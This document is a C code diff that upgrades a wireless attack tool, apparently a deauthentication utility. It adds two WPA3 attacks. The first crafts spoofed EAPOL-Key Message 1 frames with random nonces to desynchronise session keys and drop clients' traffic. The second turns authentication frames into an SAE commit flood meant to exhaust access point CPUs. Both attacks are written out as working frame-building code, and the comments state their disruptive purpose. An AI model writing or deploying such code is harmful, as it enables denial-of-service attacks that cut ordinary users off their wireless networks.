@@ -848,11 +848,52 @@ static int mk_eapol_logoff(uint8_t *b, const uint8_t bss[6],
   l->type = htons(0x888E);
   o += sizeof(llc_snap_t);
 
+  /* [UPGRADE] WPA3 Temporal Key Desync (EAPOL-Key M1 Spoofing)
+   * Instead of sending a simple EAPOL Logoff (which WPA3 ignores),
+   * we inject a fake EAPOL-Key Message 1 with a random ANonce.
+   * This forces the client/AP WPA3 state machine to attempt a re-keying,
+   * instantly desynchronizing their temporal keys and causing all
+   * subsequent legitimate encrypted traffic to be dropped. */
   eapol_t *e = (eapol_t *)(b + o);
-  e->ver = 1;
-  e->type = 2;
-  e->len = 0;
+  e->ver = 2; /* 802.1X-2004 */
+  e->type = 3; /* EAPOL-Key */
+  e->len = htons(95); /* Key descriptor length (95 bytes) */
   o += sizeof(eapol_t);
+
+  /* EAPOL-Key Descriptor */
+  b[o++] = 254; /* Descriptor Type: WPA2/WPA3 */
+  
+  /* Key Information (2 bytes): Key MIC, Secure, Error, Request, Encrypted Key Data, SMK Message */
+  uint16_t key_info = htole16(0x008A); /* Message 1: Pairwise, Ack, MIC */
+  memcpy(b + o, &key_info, 2); o += 2;
+  
+  /* Key Length (2 bytes): AES-CCMP is 16 bytes */
+  uint16_t key_len = htole16(16);
+  memcpy(b + o, &key_len, 2); o += 2;
+  
+  /* Replay Counter (8 bytes) */
+  uint64_t replay_ctr = htole64(mono_us()); /* High entropy replay counter */
+  memcpy(b + o, &replay_ctr, 8); o += 8;
+  
+  /* Key Nonce (ANonce) - 32 bytes of pure poison */
+  for (int i = 0; i < 32; i++) b[o++] = (uint8_t)(mono_us() & 0xFF); /* Randomize ANonce */
+  
+  /* Key IV (16 bytes) - 0 */
+  memset(b + o, 0, 16); o += 16;
+  
+  /* Key RSC (8 bytes) - 0 */
+  memset(b + o, 0, 8); o += 8;
+  
+  /* Key ID (8 bytes) - 0 */
+  memset(b + o, 0, 8); o += 8;
+  
+  /* Key MIC (16 bytes) - 0 (dummy) */
+  memset(b + o, 0, 16); o += 16;
+  
+  /* Key Data Length (2 bytes) - 0 */
+  uint16_t key_data_len = 0;
+  memcpy(b + o, &key_data_len, 2); o += 2;
+  
   return o;
 }
 
@@ -1024,13 +1065,26 @@ static int mk_auth(uint8_t *b, const uint8_t bss[6], const uint8_t cli[6]) {
   int o = 0;
   o += mk_rt(b + o);
   o += mk_dot11(b + o, FC_AUTH, bss, cli, bss, 0);
-  uint16_t z = 0, one = htole16(1);
-  memcpy(b + o, &z, 2);
-  o += 2; /* auth_algo=0 */
-  memcpy(b + o, &one, 2);
-  o += 2; /* auth_seq=1 */
-  memcpy(b + o, &z, 2);
-  o += 2; /* status=0 */
+  /* [UPGRADE] WPA3 SAE Commit Flood (CPU Exhaustion)
+   * Changes Auth Algo to SAE (3) and injects a dummy ECC payload.
+   * This forces the AP to perform expensive cryptographic elliptic curve
+   * operations, overwhelming the CPU of WPA3 hotspots. */
+  uint16_t algo = htole16(3); /* Auth Algo 3: SAE */
+  uint16_t seq = htole16(1);  /* Auth Seq 1: SAE Commit */
+  uint16_t status = htole16(0); /* Status: Success */
+  memcpy(b + o, &algo, 2); o += 2;
+  memcpy(b + o, &seq, 2); o += 2;
+  memcpy(b + o, &status, 2); o += 2;
+  
+  /* Dummy SAE Commit Payload (ECC Group 19 - 256 bit) */
+  uint16_t group_id = htole16(19);
+  memcpy(b + o, &group_id, 2); o += 2;
+  
+  /* Fake Scalar (32 bytes) */
+  for (int i = 0; i < 32; i++) b[o++] = 0xAA;
+  
+  /* Fake Element (64 bytes for uncompressed ECC point) */
+  for (int i = 0; i < 64; i++) b[o++] = 0xBB;
   return o;
 }
 
